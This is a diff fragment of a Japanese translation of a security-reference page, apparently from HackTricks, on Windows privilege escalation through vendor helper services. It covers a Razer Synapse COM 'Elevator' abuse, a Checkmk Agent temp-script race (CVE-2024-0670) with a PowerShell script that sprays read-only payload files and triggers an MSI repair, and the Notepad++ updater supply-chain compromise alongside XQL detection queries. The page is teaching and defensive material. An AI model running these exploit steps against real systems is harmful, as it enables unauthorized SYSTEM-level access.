+- 113（`0x71`）を 114（`0x72`）に置き換えると、full SYSTEM token を維持し、high-integrity SID（`S-1-16-12288`）を設定する generic branch に入ります。そのため、spawn された binary は local と cross-machine の両方で、制限のない SYSTEM として実行されます。
+- これを exposed installer flag（`Setup.exe -nocheck`）と組み合わせると、lab VMs 上でも ACC を起動し、vendor hardware なしで pipe を利用できます。<sup>[[6]](#references)</sup>
 
-これらの IPC bugs は、localhost services が mutual authentication（ALPC SIDs、`ImpersonationLevel=Impersonation` filters、token filtering）を enforce しなければならない理由と、各 module の “run arbitrary binary” helper が同じ signer verifications を共有しなければならない理由を示している。
+これらの IPC bugs は、localhost services が mutual authentication（ALPC SIDs、`ImpersonationLevel=Impersonation` filters、token filtering）を強制しなければならない理由と、各 module の “run arbitrary binary” helper が同一の signer verifications を共有しなければならない理由を示しています。
 
 ---
 ## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)
 
-Razer Synapse 4 は、この family にもう 1 つ有用な pattern を追加した。低権限 user が COM helper に対して `RzUtility.Elevator` 経由で process の launch を request できる一方で、trust decision は privileged boundary 内で robust に enforce されるのではなく、user-mode DLL (`simple_service.dll`) に delegate されている。
+Razer Synapse 4 は、この family における別の有用な pattern を追加しました。low-privileged user は、`RzUtility.Elevator` を介して COM helper に process の launch を要求できますが、trust decision は privileged boundary 内で robust に enforce されるのではなく、user-mode DLL（`simple_service.dll`）に委譲されています。
 
 Observed exploitation path:
-- COM object `RzUtility.Elevator` を instantiate する。
-- `LaunchProcessNoWait(<path>, "", 1)` を call して elevated launch を request する。
-- public PoC では、request を issue する前に `simple_service.dll` 内の PE-signature gate を patch out し、attacker が選んだ arbitrary executable を launch できるようにしている。
+- COM object `RzUtility.Elevator` を instantiate します。
+- `LaunchProcessNoWait(<path>, "", 1)` を call して、elevated launch を要求します。
+- public PoC では、request を発行する前に `simple_service.dll` 内部の PE-signature gate を patch out することで、攻撃者が選択した任意の executable を launch できます。<sup>[[6]](#references)</sup>
 
 Minimal PowerShell invocation:
 ```powershell
 $com = New-Object -ComObject 'RzUtility.Elevator'
 $com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
 ```
-一般的な要点: “helper” スイートをリバースするときは、localhost TCP や named pipes だけで止めないこと。`Elevator`、`Launcher`、`Updater`、`Utility` などの名前を持つ COM classes を確認し、その上で privileged service が実際に target binary 自体を検証しているのか、それとも patch 可能な user-mode client DLL が計算した結果を単に信頼しているだけなのかを確かめること。このパターンは Razer を超えて一般化できる: 高権限の broker が低権限側からの allow/deny decision を受け取る split design は、どれも privesc surface の候補になる。
-
+一般的な要点: 「helper」suiteをreverseするときは、localhost TCPやnamed pipeだけで調査を止めないこと。`Elevator`、`Launcher`、`Updater`、`Utility`などの名前を持つCOM classesを確認し、privileged serviceがtarget binary自体を実際にvalidateしているのか、それともpatch可能なuser-mode client DLLが計算した結果を単にtrustしているだけなのかを検証すること。このパターンはRazerに限らず一般化できる。high-privilege brokerがlow-privilege側からallow/denyの判断を受け取る分離設計は、いずれもprivesc surfaceの候補となる。
 
 ---
-## MSI repair 中の予測可能な temp script 実行 (Checkmk Agent / CVE-2024-0670)
+## MSI repair中の予測可能なtemp script実行（Checkmk Agent / CVE-2024-0670）
 
-一部の Windows agents は、特権操作を `C:\Windows\Temp` に一時的な `.cmd` を書き込み、それを `SYSTEM` として実行することで実装している。ファイル名が予測可能で、かつ service が既存ファイルを安全に再作成しない場合、低権限ユーザーは将来作成される temp file を **read-only** で事前作成でき、privileged process に自分の script ではなく attacker-controlled content を実行させられる。
+一部のWindows agentは、今でも`C:\Windows\Temp`に一時的な`.cmd`をwriteし、それを`SYSTEM`として実行することでprivileged actionを実装している。filenameが予測可能で、serviceが既存のfileを安全に再作成しない場合、low-privileged userは将来使用されるtemp fileを**read-only**として事前に作成できる。その結果、privileged processは自身のscriptではなく、attackerが制御するcontentを実行する。
 
-脆弱な Checkmk Agent build で観測された内容:
+脆弱なCheckmk Agent buildで確認された内容:
 - temp pattern: `cmk_all_<PID>_1.cmd`
-- affected branches: `2.0.0`, `2.1.0`, `2.2.0`
-- trigger: キャッシュ済み agent package の MSI **repair**
+- affected branches: `2.0.0`、`2.1.0`、`2.2.0`
+- trigger: cached agent packageのMSI **repair**<sup>[[8]](#references)[[9]](#references)</sup>
 
-実用的な手順:
-1. 現在の process ID か、動作中の agent PID から現実的な PID range を見積もる。
-2. 短い **ASCII** の `.cmd` payload を書く (`Set-Content -Encoding Ascii` または `cmd.exe` のリダイレクトを使う; batch files では UTF-16 PowerShell output を避ける)。
-3. 候補範囲にわたって `C:\Windows\Temp\cmk_all_<PID>_1.cmd` を展開し、各ファイルを read-only に設定する。
-4. キャッシュされた MSI の repair をトリガーし、privileged service に temp script の再生成と実行を試みさせる。
+実践的なworkflow:
+1. 現在のprocess IDまたは実行中のagent PIDから、現実的なPID rangeを見積もる。
+2. 短い**ASCII**の`.cmd` payloadをwriteする（`Set-Content -Encoding Ascii`または`cmd.exe`のredirectionを使用し、batch fileへのUTF-16 PowerShell outputは避ける）。
+3. 候補range全体に`C:\Windows\Temp\cmk_all_<PID>_1.cmd`をsprayし、各fileをread-onlyに設定する。
+4. cached MSIのrepairをtriggerし、privileged serviceがtemp scriptを再生成してから実行しようとする状態にする。<sup>[[7]](#references)</sup>
 ```powershell
 Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
 1..10000 | ForEach-Object {
@@ -270,7 +270,7 @@ Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
 Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
 }
 ```
-脆弱な製品が Windows Installer でインストールされている場合、修復をトリガーする前に、`C:\Windows\Installer` 配下のランダムに見えるキャッシュ済み MSI をその製品名に対応付ける:
+脆弱な製品が Windows Installer でインストールされている場合は、修復を実行する前に、`C:\Windows\Installer` 配下にあるランダムに見えるキャッシュ済み MSI を製品名に対応付けます:<sup>[[7]](#references)</sup>
 ```powershell
 Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
 ForEach-Object {
@@ -280,29 +280,29 @@ $p = Get-ItemProperty $_.PSPath
 
 msiexec /fa C:\Windows\Installer\<cached-agent>.msi
 ```
-Operational notes:
-- `qwinsta` は、非対話的な WinRM shell から `msiexec /fa` が失敗したときに有用で、既存の desktop/disconnected session が repair を正しくトリガーできるかどうかを把握するのに役立つ。
-- このパターンは、world-writable な場所に temp scripts を stage し、後でそれらを SYSTEM として実行する他の endpoint agents や updaters にも一般化できる。予測可能な名前、排他的 create semantics の欠如、そして on demand でトリガーできる repair/update flows をテストすること。
+運用上の注意:
+- `msiexec /fa` が非対話型の WinRM shell から失敗し、既存の desktop/disconnected session によって repair を正しく trigger できるか確認する必要がある場合、`qwinsta` が役立ちます。<sup>[[7]](#references)</sup>
+- このパターンは、**world-writable な場所に一時スクリプトを staging し、後から SYSTEM として実行する**他の endpoint agent や updater にも一般化できます。予測可能な名前、exclusive create semantics の欠如、オンデマンドで trigger 可能な repair/update flow をテストしてください。
 
 ---
-## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)
+## 弱い updater validation を介した remote supply-chain hijack（WinGUp / Notepad++）
 
-2025年6月から2025年12月の間、Notepad++ の update flow を支える hosting infrastructure を侵害した attackers は、選択した victims に対して malicious manifests を選択的に配信した。古い WinGUp ベースの updaters は update authenticity を完全には検証していなかったため、hostile XML response により clients を attacker-controlled URLs にリダイレクトできた。client が信頼された certificate chain とダウンロードされた installer の valid PE signature の両方を強制せずに HTTPS content を受け入れていたため、victims は trojanized な NSIS `update.exe` を取得し実行した。
+2025年6月から2025年12月にかけて、Notepad++ の update flow の背後にある hosting infrastructure を侵害した攻撃者が、選択した victim に対して malicious manifest を選択的に配信しました。古い WinGUp ベースの updater は update の authenticity を完全には検証していなかったため、悪意のある XML response によって client を攻撃者が管理する URL へ redirect できました。client は、信頼できる certificate chain と、download した installer の有効な PE signature の両方を強制せずに HTTPS content を受け入れていたため、victim は trojanized NSIS `update.exe` を fetch して実行しました。<sup>[[12]](#references)[[13]](#references)</sup>
 
-Operational flow (no local exploit required):
-1. **Infrastructure interception**: CDN/hosting を侵害し、attacker metadata を使って malicious download URL を指す update checks に応答する。
-2. **Trojanized NSIS**: installer は payload を fetch/execute し、2つの execution chains を悪用する:
-- **Bring-your-own signed binary + sideload**: signed な Bitdefender `BluetoothService.exe` を同梱し、その search path に malicious `log.dll` を配置する。signed binary が実行されると、Windows は `log.dll` を sideload し、これが Chrysalis backdoor を decrypt して reflective load する（Warbird-protected + API hashing により static detection を妨害）。
-- **Scripted shellcode injection**: NSIS は compiled Lua script を実行し、Win32 APIs（例: `EnumWindowStationsW`）を使って shellcode を inject し、Cobalt Strike Beacon を stage する。
+運用 flow（local exploit は不要）:
+1. **Infrastructure interception**: CDN/hosting を侵害し、malicious download URL を指す attacker metadata を含めて update check に応答する。
+2. **Trojanized NSIS**: installer が payload を fetch/execute し、2つの execution chain を悪用する:
+- **Bring-your-own signed binary + sideload**: signed な Bitdefender `BluetoothService.exe` を同梱し、その search path に malicious な `log.dll` を配置する。signed binary が実行されると、Windows は `log.dll` を sideload し、これが Chrysalis backdoor（Warbird-protected + static detection を妨げる API hashing）を decrypt して reflectively load する。
+- **Scripted shellcode injection**: NSIS が compiled Lua script を実行する。この script は Win32 API（例: `EnumWindowStationsW`）を使用して shellcode を inject し、Cobalt Strike Beacon を staging する。<sup>[[12]](#references)</sup>
 
-Hardening/detection takeaways for any auto-updater:
-- ダウンロードされた installer に対して **certificate + signature verification** を強制する（vendor signer を pin し、不一致の CN/chain は reject する）。update manifest 自体も署名する（例: XMLDSig）。検証されない限り manifest-controlled redirects を block する。
-- **BYO signed binary sideloading** を post-download の detection pivot として扱う: signed vendor EXE が canonical install path の外側から DLL 名を load したとき（例: Bitdefender が Temp/Downloads から `log.dll` を load する）、また updater が temp から non-vendor signatures の installer を drop/execute したときに alert する。
-- この chain で観測された **malware-specific artifacts** を monitor する（generic pivots として有用）: mutex `Global\Jdhfv_1.0.1`、`%TEMP%` への anomalous な `gup.exe` writes、Lua-driven shellcode injection stages。
-- Notepad++ は v8.8.9 以降で WinGUp を強化した: 返される XML は now signed (XMLDSig) となり、新しい builds は transport のみを信頼するのではなく、ダウンロードされた installer に対して certificate + signature verification を強制する。
+あらゆる auto-updater に対する hardening/detection の要点:
+- download した installer の **certificate + signature verification** を強制する（vendor signer を pin し、異なる CN/chain を reject する）。また update manifest 自体にも署名する（例: XMLDSig）。manifest によって制御される redirect は、validation されない限り block する。
+- **BYO signed binary sideloading** を post-download detection pivot として扱う。signed な vendor EXE が canonical install path 外の DLL name を load した場合（例: Bitdefender が Temp/Downloads から `log.dll` を load）や、updater が temp から non-vendor signature の installer を drop/execute した場合に alert する。
+- この chain で確認された malware-specific artifact を監視する（generic pivot として有用）: mutex `Global\Jdhfv_1.0.1`、`%TEMP%` への anomalous な `gup.exe` write、Lua-driven shellcode injection stage。
+- Notepad++ は v8.8.9 以降で WinGUp を強化して対応した。返される XML は現在署名（XMLDSig）されており、新しい build では transport のみを信頼するのではなく、download した installer の certificate + signature verification を強制する。<sup>[[13]](#references)</sup>
 
 <details>
-<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
+<summary>Cortex XDR XQL – Bitdefender-signed EXE による <code>log.dll</code> sideloading (T1574.001)</summary>
 ```sql
 // Identifies Bitdefender-signed processes loading log.dll outside vendor paths
 config case_sensitive = false
@@ -316,7 +316,7 @@ config case_sensitive = false
 </details>
 
 <details>
-<summary>Cortex XDR XQL – <code>gup.exe</code> launching a non-Notepad++ installer</summary>
+<summary>Cortex XDR XQL – <code>gup.exe</code> による Notepad++ 以外のインストーラーの起動</summary>
 ```sql
 config case_sensitive = false
 | dataset = xdr_data
@@ -327,25 +327,24 @@ config case_sensitive = false
 ```
 </details>
 
-これらのパターンは、署名されていない manifest を受け入れる updater や installer signer の pinning に失敗する updater なら、どれにも一般化できる。つまり、network hijack + malicious installer + BYO-signed sideloading により、“trusted” updates を装った remote code execution が可能になる。
+これらのパターンは、署名されていないマニフェストを受け入れる、またはインストーラーの署名者を固定しないあらゆる updater に当てはまります。network hijack + malicious installer + BYO-signed sideloading により、「trusted」update を装って remote code execution が可能になります。
 
 ---
-## References
-- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
-- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
-- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
-- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
-- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
-- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
-- [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
-- [SEC Consult – Local Privilege Escalation via writable files in Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
-- [Checkmk Werk #16361 – Privilege escalation in Windows agent](https://checkmk.com/werk/16361)
-- [RunasCs](https://github.com/antonioCoco/RunasCs)
-- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
-- [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
-- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
-- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
-- [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
-- [Atredis – Uncovering Privilege Escalation Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
+## 参考資料
+- [1] [Advisory – Netskope Client for Windows – Rogue Server 経由のローカル権限昇格 (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
+- [2] [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
+- [3] [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
+- [4] [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
+- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
+- [6] [SensePost – Pwning ASUS DriverHub、MSI Center、Acer Control Centre、Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
+- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
+- [8] [SEC Consult – Checkmk Agent の書き込み可能なファイルを介したローカル権限昇格](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
+- [9] [Checkmk Werk #16361 – Windows agent の権限昇格](https://checkmk.com/werk/16361)
+- [10] [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
+- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
+- [12] [Unit 42 – Nation-State Actors が Notepad++ の Supply Chain を悪用](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
+- [13] [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
+- [14] [AmberWolf – Netskope Client for Windows の CVE-2025-0309 に対する fix の bypass](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
+- [15] [Atredis – Lenovo Vantage の権限昇格バグを解明](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
 
 {{#include ../../banners/hacktricks-training.md}}
